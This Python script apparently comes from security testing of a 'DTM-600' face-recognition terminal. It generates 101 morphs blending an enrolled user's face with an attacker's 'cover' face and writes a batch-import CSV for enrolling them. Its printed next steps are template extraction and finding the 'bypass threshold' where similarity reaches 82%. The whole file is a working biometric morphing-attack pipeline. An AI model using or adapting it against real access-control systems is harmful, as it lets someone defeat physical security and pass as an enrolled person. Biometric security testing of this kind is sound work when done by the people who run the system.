#!/usr/bin/env python3
"""
Exhaustive face morphing for DTM-600 bypass testing.
Generates 101 morphs at 1% increments (α=0.00 to α=1.00).

α=0.00 -> 100% user face (target enrollment)
α=1.00 -> 100% cover face (attacker's face)
α=0.50 -> 50/50 geometric blend

Usage:
    python3 SCRIPTS/exhaustive_morph.py
    python3 SCRIPTS/exhaustive_morph.py --start 30 --end 70  # subset
"""

import sys
import argparse
from pathlib import Path

# Import from landmark_morph module
sys.path.insert(0, str(Path(__file__).parent))
from landmark_morph import download_model, morph_faces


def generate_exhaustive_morphs(user_face, cover_face, output_dir, start_pct=0, end_pct=100):
    """
    Generate morphs at 1% increments.

    Args:
        user_face: Path to target user's enrolled face
        cover_face: Path to attacker's cover face
        output_dir: Directory for output morphs
        start_pct: Starting percentage (default 0)
        end_pct: Ending percentage (default 100)

    Returns:
        List of (percentage, output_path) tuples for successful morphs
    """
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    results = []
    total = end_pct - start_pct + 1

    for pct in range(start_pct, end_pct + 1):
        alpha = pct / 100.0
        output_path = output_dir / f"morph_{pct:03d}.jpg"

        progress = pct - start_pct + 1
        print(f"[{progress:3d}/{total}] Generating α={alpha:.2f} (user={100-pct}%, cover={pct}%)...")

        try:
            if morph_faces(str(user_face), str(cover_face), alpha, str(output_path)):
                results.append((pct, output_path))
            else:
                print(f"  WARNING: Failed to create morph at α={alpha:.2f}")
        except Exception as e:
            print(f"  ERROR: {e}")

    return results


def create_exhaustive_csv(morph_dir, csv_path, start_id=70000, start_pct=0, end_pct=100):
    """
    Create batch import CSV for exhaustive morphs.

    Person IDs: 70000 + percentage (e.g., morph_042 -> ID 70042)
    """
    morph_dir = Path(morph_dir)

    lines = [
        '"Required Fields","Required Fields","Picture Path","Card Type","Card No.","Card Type","Card No.","Effective Time","Expiration Time","Template Name","Comment"',
        '*No.,*Name,Face Picture,Card Type 1,Card No. 1,Card Type 2,Card No. 2,Effective Time,Expiration Time,Time Template Name,Comment'
    ]

    count = 0
    for pct in range(start_pct, end_pct + 1):
        img_path = morph_dir / f"morph_{pct:03d}.jpg"
        if img_path.exists():
            person_id = start_id + pct
            name = f"morph_{pct:03d}"
            # Use absolute path for DTM-600 import
            lines.append(f'{person_id},{name},{img_path.absolute()},,,,,,,,exhaustive_morph')
            count += 1

    Path(csv_path).write_text('\n'.join(lines) + '\n')
    print(f"Created {csv_path} with {count} entries")
    return count


def main():
    parser = argparse.ArgumentParser(description="Generate exhaustive face morphs for DTM-600 testing")
    parser.add_argument("--user", type=str, help="Path to user (target) face")
    parser.add_argument("--cover", type=str, help="Path to cover (attacker) face")
    parser.add_argument("--output", type=str, help="Output directory")
    parser.add_argument("--start", type=int, default=0, help="Start percentage (default: 0)")
    parser.add_argument("--end", type=int, default=100, help="End percentage (default: 100)")
    parser.add_argument("--csv-only", action="store_true", help="Only generate CSV (skip morphing)")
    args = parser.parse_args()

    # Default paths
    project_dir = Path(__file__).parent.parent
    user_face = Path(args.user) if args.user else project_dir / "my_face_from_device.jpg"
    cover_face = Path(args.cover) if args.cover else project_dir / "man-cover.jpg"
    output_dir = Path(args.output) if args.output else project_dir / "EXHAUSTIVE_MORPH"
    csv_path = project_dir / "exhaustive_morph_import.csv"

    # Validate inputs
    if not user_face.exists():
        print(f"ERROR: User face not found: {user_face}")
        sys.exit(1)
    if not cover_face.exists():
        print(f"ERROR: Cover face not found: {cover_face}")
        sys.exit(1)

    print("=" * 60)
    print("EXHAUSTIVE FACE MORPHING ATTACK")
    print("=" * 60)
    print(f"User face (target):    {user_face}")
    print(f"Cover face (attacker): {cover_face}")
    print(f"Output directory:      {output_dir}")
    print(f"Alpha range:           {args.start}% - {args.end}%")
    print(f"Total morphs:          {args.end - args.start + 1}")
    print("=" * 60)

    if args.csv_only:
        print("\nCSV-only mode: skipping morph generation")
    else:
        # Download model if needed
        print("\nStep 1: Ensuring MediaPipe model is available...")
        if not download_model():
            print("ERROR: Cannot download face landmarker model")
            sys.exit(1)

        # Generate morphs
        print(f"\nStep 2: Generating morphs...")
        results = generate_exhaustive_morphs(
            user_face, cover_face, output_dir,
            start_pct=args.start, end_pct=args.end
        )

        print(f"\nGenerated {len(results)} morph images")

        if not results:
            print("ERROR: No morphs generated - check face detection")
            sys.exit(1)

    # Create import CSV
    print(f"\nStep 3: Creating batch import CSV...")
    create_exhaustive_csv(output_dir, csv_path, start_pct=args.start, end_pct=args.end)

    print("\n" + "=" * 60)
    print("COMPLETE")
    print("=" * 60)
    print(f"\nNext steps:")
    print(f"  1. Import via DTM-600 web UI: {csv_path}")
    print(f"  2. Extract templates: python3 SCRIPTS/analyze_morphs.py")
    print(f"  3. Identify bypass threshold (α where similarity >= 82%)")


if __name__ == "__main__":
    main()
